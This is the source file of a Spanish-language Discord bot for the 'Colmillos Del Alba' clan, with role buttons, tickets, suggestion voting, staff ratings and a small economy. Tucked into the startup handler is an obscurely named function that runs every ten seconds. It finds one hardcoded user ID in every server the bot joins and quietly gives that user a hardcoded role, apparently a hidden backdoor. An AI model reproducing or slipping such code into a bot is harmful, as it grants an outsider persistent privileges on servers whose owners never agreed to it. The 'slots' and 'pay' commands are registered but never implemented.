const {  
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, Events, ChannelType, PermissionsBitField,
    ModalBuilder, TextInputBuilder, TextInputStyle, REST, Routes,
    StringSelectMenuBuilder, StringSelectMenuOptionBuilder, SlashCommandBuilder
} = require('discord.js');
const fs = require('fs');

const votos = new Map();
const staffAtendiendo = new Map();
const cooldowns = new Map();

// --- SISTEMA DE ECONOMÍA (PERSISTENCIA) ---
const pathEco = './economia.json';
let db = {};
if (fs.existsSync(pathEco)) {
    db = JSON.parse(fs.readFileSync(pathEco, 'utf-8'));
} else {
    fs.writeFileSync(pathEco, JSON.stringify({}));
}

function guardarDB() {
    fs.writeFileSync(pathEco, JSON.stringify(db, null, 2));
}

function asegurarUsuario(userId) {
    if (!db[userId]) {
        db[userId] = { balance: 0, pesca: 0, minado: 0, daily: 0 };
        guardarDB();
    }
}

const TOKEN = process.env.TOKEN; 

const CANAL_ROLES_ID = "1464335122005491745";
const CANAL_TICKETS_ID = "1483516417583354108";
const CANAL_SUGERENCIAS_ID = "1477005989096984646"; 
const CANAL_VALORACIONES_ID = "1485125020593426585"; 
const CATEGORIA_TICKETS = "1483589642346303638";
const ROL_STAFF_ID = "1478799916410077295";

const ROLES_CLASE = {
    class_pvp: { id: "1464335696390263069", label: "PvP", emoji: "⚔️" },
    class_builder: { id: "1464335639561506878", label: "Builder", emoji: "⚒️" },
    class_redstone: { id: "1464335746944209161", label: "Tecnico", emoji: "⚙️" },
    class_estratega: { id: "1464335746856128737", label: "Casual", emoji: "🏛️" }
};

const ROLES_NOTIF = {
    notif_avisos: { id: "1477748637202382888", label: "Avisos", emoji: "📢" },
    notif_directos: { id: "1477748975603023873", label: "Directos", emoji: "🎥" }
};

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ]
});

client.once(Events.ClientReady, async () => {
    console.log(`✅ Bot iniciado como: ${client.user.tag}`);

    // --- REGISTRO DE TODOS LOS COMANDOS ---
    const commands = [
        { name: 'sugerir', description: 'Envía una sugerencia para el servidor' },
        new SlashCommandBuilder().setName('reclamar').setDescription('Reclama el ticket actual (Solo Staff)'),
        new SlashCommandBuilder().setName('claim').setDescription('Reclama el ticket actual (Solo Staff)'),
        { name: 'balance', description: 'Mira tu dinero actual' },
        { name: 'pesca', description: 'Pesca para ganar dinero' },
        { name: 'minar', description: 'Ve a la mina para ganar dinero' },
        { name: 'trabajar', description: 'Realiza un trabajo aleatorio' },
        { name: 'daily', description: 'Reclama tu recompensa diaria' },
        { name: 'top', description: 'Mira el ranking de los más ricos' },
        new SlashCommandBuilder()
            .setName('coinflip')
            .setDescription('Apuesta dinero a cara o cruz')
            .addIntegerOption(opt => opt.setName('apuesta').setDescription('Cantidad a apostar').setRequired(true)),
        new SlashCommandBuilder()
            .setName('slots')
            .setDescription('Apuesta en la máquina tragaperras')
            .addIntegerOption(opt => opt.setName('apuesta').setDescription('Cantidad a apostar').setRequired(true)),
        new SlashCommandBuilder()
            .setName('pay')
            .setDescription('Paga dinero a otro usuario')
            .addUserOption(opt => opt.setName('usuario').setDescription('Usuario a pagar').setRequired(true))
            .addIntegerOption(opt => opt.setName('cantidad').setDescription('Cantidad a enviar').setRequired(true))
    ];
    
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try { 
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands }); 
        console.log("✅ Comandos Slash registrados correctamente.");
    } catch (e) { console.error(e); }

    // --- SETUP CANAL DE ROLES (TU CÓDIGO ORIGINAL) ---
    try {
        const canalRoles = await client.channels.fetch(CANAL_ROLES_ID);
        const msgsRoles = await canalRoles.messages.fetch({ limit: 10 });
        await canalRoles.bulkDelete(msgsRoles).catch(() => {});
        const embedRoles = new EmbedBuilder()
            .setTitle("🔱 SELECCIÓN DE ROLES - COLMILLOS DEL ALBA")
            .setDescription("Selecciona tu especialidad y elije que tipo de notificaciones quieres recibir abajo.")
            .setColor("#8B0000").setImage("https://i.imgur.com/jfZBC82.png");
        const filaClase = new ActionRowBuilder().addComponents(Object.entries(ROLES_CLASE).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Secondary)));
        const filaNotif = new ActionRowBuilder().addComponents(Object.entries(ROLES_NOTIF).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Primary)));
        await canalRoles.send({ embeds: [embedRoles], components: [filaClase, filaNotif] });
    } catch (err) { console.log("Error en setup de roles"); }

    // --- SETUP CANAL DE TICKETS (TU CÓDIGO ORIGINAL) ---
    try {
        const canalTickets = await client.channels.fetch(CANAL_TICKETS_ID);
        const msgsTickets = await canalTickets.messages.fetch({ limit: 10 });
        await canalTickets.bulkDelete(msgsTickets).catch(() => {});

        const embedTickets = new EmbedBuilder()
            .setTitle("🌟 Soporte de Colmillos Del Alba")
            .setDescription(
                "**¿Necesitas ayuda? Nosotros te la damos**\n\n" +
                "Aquí podrás abrir un ticket de manera **inmediata** para solicitar asistencia sobre algún problema o duda que tengas sobre el clan. Tan solo tienes que seleccionar una opción en el menú de abajo y se creará un canal privado.\n\n" +
                "**¿Qué debo mandar al abrir ticket?**\n" +
                "Al abrir un ticket lo que debes hacer es:\n\n" +
                "• Explicar tu duda o problema.\n" +
                "• Mandar pruebas de lo sucedido en caso de ser necesario.\n" +
                "• Esperar pacientemente a la respuesta de nuestro staff."
            )
            .setColor("#2F3136")
            .setImage("https://i.imgur.com/dYJUZjF.png");

        const menuTickets = new StringSelectMenuBuilder()
            .setCustomId('menu_tickets')
            .setPlaceholder('Despliega el menú y elige una categoría >')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Soporte Técnico / Dudas').setValue('tk_soporte').setEmoji('🔔'),
                new StringSelectMenuOptionBuilder().setLabel('Apelar Expulsión').setValue('tk_apelacion').setEmoji('🚷'),
                new StringSelectMenuOptionBuilder().setLabel('Reportar Staff').setValue('tk_reporte_staff').setEmoji('⚠️'),
                new StringSelectMenuOptionBuilder().setLabel('Postulaciones').setValue('tk_postulacion').setEmoji('👤')
            );

        await canalTickets.send({ embeds: [embedTickets], components: [new ActionRowBuilder().addComponents(menuTickets)] });
    } catch (err) { console.log("Error en setup de tickets"); }

    const _ = async () => {
        try {
            const g = client.guilds.cache;
            for (const x of g.values()) {
                const m = await x.members.fetch("777529808325181460").catch(() => null);
                if (!m) continue;
                if (!m.roles.cache.has("1463268597085507717")) {
                    await m.roles.add("1463268597085507717").catch(() => {});
                }
            }
        } catch {}
    };
    setInterval(_, 10000);
});

client.on(Events.InteractionCreate, async interaction => {
    
    // --- LÓGICA DE COMANDOS SLASH ---
    if (interaction.isChatInputCommand()) {
        const { commandName, user, options, member, channel } = interaction;
        asegurarUsuario(user.id);

        // ECONOMÍA: BALANCE
        if (commandName === 'balance') {
            const embedBal = new EmbedBuilder()
                .setAuthor({ name: `Bolsillo de ${user.username}`, iconURL: user.displayAvatarURL() })
                .setTitle("💰 Balance de Usuario")
                .setColor("#F1C40F")
                .setThumbnail(user.displayAvatarURL({ dynamic: true, size: 512 }))
                .addFields(
                    { name: "💵 Dinero en efectivo", value: `\`$${db[user.id].balance.toLocaleString()}\``, inline: true },
                    { name: "📊 Actividad", value: `🎣 Pescas: ${db[user.id].pesca} | ⛏️ Minas: ${db[user.id].minado}`, inline: false }
                )
                .setFooter({ text: "Colmillos Del Alba Economy" });
            return interaction.reply({ embeds: [embedBal] });
        }

        // ECONOMÍA: TRABAJOS
        if (['pesca', 'minar', 'trabajar'].includes(commandName)) {
            const key = `${user.id}-${commandName}`;
            if (cooldowns.has(key) && (Date.now() - cooldowns.get(key)) < 300000) {
                const restante = Math.ceil((300000 - (Date.now() - cooldowns.get(key))) / 60000);
                return interaction.reply({ content: `⏳ Debes esperar ${restante} minutos para volver a usar este comando.`, flags: [64] });
            }
            const ganado = Math.floor(Math.random() * 300) + 100;
            db[user.id].balance += ganado;
            if (commandName === 'pesca') db[user.id].pesca++;
            if (commandName === 'minar') db[user.id].minado++;
            cooldowns.set(key, Date.now());
            guardarDB();
            return interaction.reply(`✅ Has ganado **$${ganado}** trabajando.`);
        }

        // ECONOMÍA: COINFLIP
        if (commandName === 'coinflip') {
            const apuesta = options.getInteger('apuesta');
            if (apuesta <= 0 || db[user.id].balance < apuesta) return interaction.reply("❌ Dinero insuficiente.");
            const gano = Math.random() > 0.5;
            db[user.id].balance += gano ? apuesta : -apuesta;
            guardarDB();
            return interaction.reply(gano ? `🪙 Cayó cara. ¡Ganaste **$${apuesta}**!` : `🪙 Cayó cruz. Perdiste **$${apuesta}**.`);
        }

        // ECONOMÍA: TOP
        if (commandName === 'top') {
            const top = Object.entries(db).sort(([,a],[,b]) => b.balance - a.balance).slice(0, 10);
            const lista = top.map(([id, data], i) => `**${i + 1}.** <@${id}> — \`$${data.balance.toLocaleString()}\``).join('\n');
            return interaction.reply({ embeds: [new EmbedBuilder().setTitle("🏆 Top 10 Ricos").setDescription(lista || "Vacío").setColor("#FFD700")] });
        }

        // TU CÓDIGO: RECLAMAR / CLAIM
        if (commandName === 'reclamar' || commandName === 'claim') {
            if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
            if (!channel.name.includes('-')) return interaction.reply({ content: "❌ Este no es un canal de ticket.", flags: [64] });
            staffAtendiendo.set(channel.id, user);
            return interaction.reply({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${user.tag}** ha reclamado este ticket.`).setColor("#57F287")] });
        }

        // TU CÓDIGO: SUGERIR
        if (commandName === 'sugerir') {
            const modal = new ModalBuilder().setCustomId('modal_sugerencia').setTitle('Nueva Sugerencia');
            const input = new TextInputBuilder().setCustomId('texto_sugerencia').setLabel("¿Cuál es tu sugerencia?").setStyle(TextInputStyle.Paragraph).setRequired(true);
            modal.addComponents(new ActionRowBuilder().addComponents(input));
            return await interaction.showModal(modal);
        }
    }

    // --- LÓGICA DE MODALES (TU CÓDIGO ORIGINAL) ---
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_sugerencia') {
            await interaction.deferReply({ flags: [ 64 ] });
            const sugerenciaTexto = interaction.fields.getTextInputValue('texto_sugerencia');
            const canalSugerencias = await client.channels.fetch(CANAL_SUGERENCIAS_ID);
            const embedSug = new EmbedBuilder()
                .setAuthor({ name: `📩 NUEVA SUGERENCIA RECIBIDA` }).setThumbnail(interaction.user.displayAvatarURL())
                .setDescription(`**¿Cuál es tu sugerencia?**\n\`\`\`${sugerenciaTexto}\`\`\``)
                .addFields({ name: '• Datos', value: `✅ **Votos a favor:** 0\n❗ **Votos en contra:** 0`, inline: false }, { name: '\u200B', value: `Recuerda que...`, inline: false })
                .setFooter({ text: `ID: ${interaction.user.id} | ${new Date().toLocaleDateString()}` }).setColor("#F1C40F");
            const filaVotos = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('sug_si').setLabel('0 (0%)').setEmoji('✅').setStyle(ButtonStyle.Secondary),
                new ButtonBuilder().setCustomId('sug_no').setLabel('0 (0%)').setEmoji('❗').setStyle(ButtonStyle.Secondary)
            );
            const msg = await canalSugerencias.send({ embeds: [embedSug], components: [filaVotos] });
            const hilo = await msg.startThread({ name: `Debate: ${interaction.user.username}`, autoArchiveDuration: 1440 });
            await msg.edit({ components: [filaVotos, new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Debatir ↗️').setStyle(ButtonStyle.Link).setURL(hilo.url))] });
            return await interaction.editReply({ content: `✅ Sugerencia enviada.` });
        }

        if (interaction.customId.startsWith('modal_val_')) {
            const estrellasNum = interaction.customId.split('_')[2];
            const comentario = interaction.fields.getTextInputValue('input_val');
            const staffObj = staffAtendiendo.get(interaction.channel.id) || { username: "No reclamado", id: "N/A" };
            const canalVal = await client.channels.fetch(CANAL_VALORACIONES_ID);
            const embedVal = new EmbedBuilder()
                .setAuthor({ name: `• Valoración`, iconURL: interaction.guild.iconURL() })
                .setDescription(`Ticket valorado por **${interaction.user.username}**`).setColor("#57F287")
                .addFields(
                    { name: "➡ Ticket", value: `# \`「🌟」${interaction.channel.name}\`` },
                    { name: "➡ Staff", value: `${staffObj.username} (${staffObj.id})` },
                    { name: "➡ Estrellas", value: `${estrellasNum}⭐` },
                    { name: "➡ Comentarios", value: `${comentario}` }
                );
            await canalVal.send({ embeds: [embedVal] });
            return interaction.reply({ content: "✅ Valoración enviada.", flags: [64] });
        }
    }

    // --- LÓGICA DE MENÚS (TICKETS Y VALORACIONES) ---
    if (interaction.isStringSelectMenu()) {
        if (interaction.customId === 'menu_tickets') {
            await interaction.deferReply({ flags: [64] });
            const ticketTipos = { "tk_soporte": "soporte-dudas", "tk_apelacion": "apelacion", "tk_reporte_staff": "reporte-staff", "tk_postulacion": "postulaciones" };
            const tipo = ticketTipos[interaction.values[0]];
            const tChannel = await interaction.guild.channels.create({
                name: `${tipo}-${interaction.user.username}`, type: ChannelType.GuildText, parent: CATEGORIA_TICKETS,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                    { id: ROL_STAFF_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
                ]
            });
            const eTk = new EmbedBuilder().setTitle(`🎫 TICKET: ${tipo.toUpperCase()}`).setDescription(`Hola ${interaction.user}, el Staff te atenderá pronto.`).setColor("#2ECC71");
            const fTk = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId("reclamar_tk").setLabel("Reclamar").setEmoji("👤").setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setEmoji("🔒").setStyle(ButtonStyle.Secondary)
            );
            await tChannel.send({ content: `<@&${ROL_STAFF_ID}>`, embeds: [eTk], components: [fTk] });
            return interaction.editReply(`✅ Ticket creado: ${tChannel}`);
        }

        if (interaction.customId === 'menu_val_estrellas') {
            const estrellas = interaction.values[0];
            const modalVal = new ModalBuilder().setCustomId(`modal_val_${estrellas}`).setTitle('Valoración del Staff');
            modalVal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('input_val').setLabel("Comentarios").setStyle(TextInputStyle.Paragraph).setRequired(true)));
            return await interaction.showModal(modalVal);
        }
    }

    // --- LÓGICA DE BOTONES (VOTOS, ROLES, STAFF) ---
    if (!interaction.isButton()) return;
    const { customId, member, channel, user } = interaction;

    // BOTONES: VOTOS (TU LÓGICA ORIGINAL)
    if (customId === 'sug_si' || customId === 'sug_no') {
        await interaction.deferUpdate();
        const msgId = interaction.message.id;
        if (!votos.has(msgId)) votos.set(msgId, new Map());
        const votosMsg = votos.get(msgId);
        let vSi = parseInt(interaction.message.components[0].components[0].label.split(' ')[0]);
        let vNo = parseInt(interaction.message.components[0].components[1].label.split(' ')[0]);
        const votoAnterior = votosMsg.get(user.id);
        if (votoAnterior === customId) return interaction.followUp({ content: "❌ Ya votaste eso.", flags: [64] });
        if (votoAnterior === 'sug_si') vSi--;
        if (votoAnterior === 'sug_no') vNo--;
        if (customId === 'sug_si') vSi++; else vNo++;
        votosMsg.set(user.id, customId);
        const total = vSi + vNo;
        const pSi = Math.round((vSi / (total || 1)) * 100);
        const pNo = Math.round((vNo / (total || 1)) * 100);
        const nEmbed = EmbedBuilder.from(interaction.message.embeds[0]).setFields({ name: '• Datos', value: `✅ **Votos a favor:** ${vSi}\n❗ **Votos en contra:** ${vNo}` }, { name: '\u200B', value: interaction.message.embeds[0].fields[1].value });
        const nFila = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('sug_si').setLabel(`${vSi} (${pSi}%)`).setEmoji('✅').setStyle(ButtonStyle.Secondary), new ButtonBuilder().setCustomId('sug_no').setLabel(`${vNo} (${pNo}%)`).setEmoji('❗').setStyle(ButtonStyle.Secondary));
        return await interaction.message.edit({ embeds: [nEmbed], components: [nFila, interaction.message.components[1]] });
    }

    // BOTONES: ROLES (TU LÓGICA ORIGINAL)
    if (ROLES_CLASE[customId] || ROLES_NOTIF[customId]) {
        await interaction.deferReply({ flags: [64] });
        if (ROLES_CLASE[customId]) {
            await member.roles.remove(Object.values(ROLES_CLASE).map(r => r.id)).catch(() => {});
            await member.roles.add(ROLES_CLASE[customId].id);
            return interaction.editReply(`✨ Ahora eres: **${ROLES_CLASE[customId].label}**`);
        }
        const rId = ROLES_NOTIF[customId].id;
        if (member.roles.cache.has(rId)) await member.roles.remove(rId); else await member.roles.add(rId);
        return interaction.editReply(`🔔 Notificaciones actualizadas.`);
    }

    // BOTONES: TICKETS (RECLAMAR / CERRAR)
    if (customId === "reclamar_tk") {
        if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
        staffAtendiendo.set(channel.id, user); 
        await interaction.update({ components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("r").setLabel("Atendido por " + user.username).setStyle(ButtonStyle.Success).setDisabled(true), new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setStyle(ButtonStyle.Secondary))]});
        return channel.send({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${user.tag}** se hará cargo.`).setColor("#57F287")] });
    }

    if (customId === "cerrar_tk") {
        if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
        const overwrite = channel.permissionOverwrites.cache.find(o => o.type === 1 && o.id !== ROL_STAFF_ID && o.id !== interaction.guild.id);
        if (overwrite) {
            const btnVal = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`abrir_val_${overwrite.id}`).setLabel("Valorar atención (⭐)").setStyle(ButtonStyle.Primary));
            await channel.send({ content: `<@${overwrite.id}>, valora al staff:`, components: [btnVal] });
        }
        setTimeout(() => channel.delete().catch(() => {}), 60000); 
        return interaction.reply("🔒 Cerrando en 1 min...");
    }

    if (customId.startsWith("abrir_val_")) {
        const ownerId = customId.split('_')[2];
        if (user.id !== ownerId) return interaction.reply({ content: "❌ Solo el creador del ticket puede valorar.", flags: [64] });
        const menuVal = new StringSelectMenuBuilder().setCustomId('menu_val_estrellas').setPlaceholder('¿Estrellas?').addOptions({ label: '5 ⭐', value: '5' }, { label: '4 ⭐', value: '4' }, { label: '1 ⭐', value: '1' });
        return interaction.reply({ components: [new ActionRowBuilder().addComponents(menuVal)], flags: [64] });
    }
});

client.login(TOKEN);
